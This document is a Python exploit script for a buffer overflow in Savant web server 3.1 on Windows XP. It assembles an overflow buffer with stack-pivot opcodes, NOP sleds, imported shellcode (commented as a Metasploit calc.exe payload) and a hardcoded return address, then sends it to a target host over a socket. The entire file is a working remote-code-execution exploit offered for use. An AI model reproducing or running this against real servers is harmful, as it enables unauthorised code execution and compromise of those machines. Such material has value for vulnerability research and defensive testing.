#!/usr/bin/python

#Title: Savant web server 3.1 buffer overflow exploit
#Author: DouBle_Zer0 
#Version: 3.1
#Tested on: win xp sp2,3 [en]
#Vulnerability discovered by Muts(offensive security)
#\x83\xc4\x50\x54\xc3 -add esp,50 push esp ret[see the double dance of this in exploit]
#ret=00401D09[pop ebp, ret]

import socket
from payload import buf
import sys
import struct
def shell_attack(target_machine, target_port):

# win calc.exe [metasploit] (172 byte)
    host = target_machine
    
    buff3 = b"\x90" * 30
    buff2 = b"\x90" * 53
    ret =   b"\x09\x1D\x40" #savant.exe 
    buffr = b'\x83\xC4\x50\x54\xc3 /' +buff2+buff3+buf+ret + b'\r\n\r\n'
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((host,target_port))
    s.send(buffr)
    s.close()